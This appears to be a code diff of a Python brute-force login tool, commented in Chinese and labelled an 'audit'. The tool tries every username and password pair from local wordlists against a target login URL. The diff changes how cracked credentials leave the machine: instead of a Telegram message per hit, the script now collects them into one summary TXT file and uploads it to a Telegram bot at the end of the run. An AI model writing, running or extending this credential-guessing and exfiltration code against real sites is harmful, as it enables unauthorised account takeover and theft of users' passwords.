@@ -13,25 +13,23 @@ SUMMARY_TXT_PATH = "success_summary.txt"
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
 
-def send_telegram_msg(message):
-    """发送 Telegram 通知消息"""
+def send_telegram_file(file_path):
+    """直接将生成的 TXT 文件发送到 Telegram 聊天窗口"""
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
-        print("[!] 未配置 Telegram 密钥，跳过推送")
+        print("[!] 未配置 Telegram 密钥，跳过文件发送")
         return
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
-    }
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
     try:
-        res = requests.post(url, json=payload, timeout=5)
-        if res.status_code == 200:
-            print("[+] Telegram 推送成功")
-        else:
-            print(f"[!] Telegram 推送失败，返回响应: {res.text}")
+        with open(file_path, "rb") as f:
+            files = {"document": f}
+            data = {"chat_id": TELEGRAM_CHAT_ID, "caption": "📁 *审计成功凭据汇总文件*"}
+            res = requests.post(url, data=data, files=files, timeout=10)
+            if res.status_code == 200:
+                print("[+] Telegram TXT 文件发送成功")
+            else:
+                print(f"[!] Telegram 文件发送失败，返回响应: {res.text}")
     except Exception as e:
-        print(f"[!] Telegram 推送异常: {e}")
+        print(f"[!] Telegram 文件发送异常: {e}")
 
 def get_accounts():
     """直接读取本地 users.txt 文件"""
@@ -46,24 +44,6 @@ def get_passwords():
         with open("passwords.txt", "r", encoding="utf-8") as f:
             return [line.strip() for line in f if line.strip() and not line.startswith("#")]
     return []
-
-def log_success(username, password):
-    """记录成功凭据并触发电报推送"""
-    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-    
-    # 1. 写入原始日志
-    with open(RESULT_FILE_PATH, "a", encoding="utf-8") as f:
-        f.write(f"[{current_time}] 成功: 账号={username} ---- 密码={password}\n")
-        
-    # 2. 追加写入整理好的 TXT 文件
-    with open(SUMMARY_TXT_PATH, "a", encoding="utf-8") as f:
-        f.write(f"账号: {username} | 密码: {password} | 时间: {current_time}\n")
-        
-    print(f"[+] 【成功记录】 {username} -> {password} 已保存")
-    
-    # 3. 触发电报推送
-    msg = f"🚨 *发现有效凭据* 🚨\n\n- 账号: `{username}`\n- 密码: `{password}`\n- 时间: `{current_time}`"
-    send_telegram_msg(msg)
 
 def is_login_success(response):
     """针对当前目标网站的成功判定逻辑"""
@@ -91,7 +71,7 @@ def main():
         print("[!] 错误：未找到有效的账号字典(users.txt)或密码字典(passwords.txt)！")
         return
 
-    # 运行前清理旧的汇总文件
+    # 运行前清理旧文件
     for path in [RESULT_FILE_PATH, SUMMARY_TXT_PATH]:
         if os.path.exists(path):
             os.remove(path)
@@ -99,7 +79,8 @@ def main():
     print(f"[*] 全自动审计开始，共 {len(usernames)} 个账号，{len(passwords)} 个密码")
     print(f"[*] 目标: {LOGIN_URL}\n")
 
-    success_count = 0
+    successful_results = []
+    current_time_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
 
     with requests.Session() as session:
         for username in usernames:
@@ -119,8 +100,17 @@ def main():
 
                     if is_login_success(response):
                         print(f"\n[+] 【找到正确密码】 {username} -> {password}")
-                        log_success(username, password)
-                        success_count += 1
+                        success_data = {
+                            "username": username,
+                            "password": password,
+                            "time": current_time_str
+                        }
+                        successful_results.append(success_data)
+                        
+                        # 记录到原始日志
+                        with open(RESULT_FILE_PATH, "a", encoding="utf-8") as f:
+                            f.write(f"[{current_time_str}] 成功: 账号={username} ---- 密码={password}\n")
+                            
                         found = True
                         break
                 except requests.exceptions.RequestException as e:
@@ -131,12 +121,24 @@ def main():
             if not found:
                 print(f"[-] 账号 {username} 未找到正确密码")
 
-    # 【保险机制】如果整轮跑下来没有任何成功记录，也强制生成一个空结果TXT，防止Actions上传报错
-    if not os.path.exists(SUMMARY_TXT_PATH):
+    # === 全部跑完后，统一生成汇总文件并仅通过 TXT 文件发送到电报 ===
+    if successful_results:
+        summary_content = "=== 审计成功凭据汇总 ===\n\n"
+        for item in successful_results:
+            summary_content += f"账号: {item['username']} | 密码: {item['password']} | 时间: {item['time']}\n"
+        
+        # 写入汇总 TXT
         with open(SUMMARY_TXT_PATH, "w", encoding="utf-8") as f:
-            f.write(f"审计完成时间: {time.strftime('%Y-%m-%d %H:%M:%S')} - 本次未发现有效凭据或未成功匹配。\n")
+            f.write(summary_content)
+            
+        # 仅发送 TXT 文件
+        send_telegram_file(SUMMARY_TXT_PATH)
+    else:
+        # 如果没有找到，也生成一个空提示文件防止打包报错
+        with open(SUMMARY_TXT_PATH, "w", encoding="utf-8") as f:
+            f.write(f"审计完成时间: {current_time_str} - 本次未发现有效凭据。\n")
 
-    print(f"\n[*] 全自动审计结束，所有账号已处理完毕。成功找到 {success_count} 个有效凭据。")
+    print(f"\n[*] 全自动审计结束，共找到 {len(successful_results)} 个有效凭据并已打包。")
 
 if __name__ == "__main__":
     main()
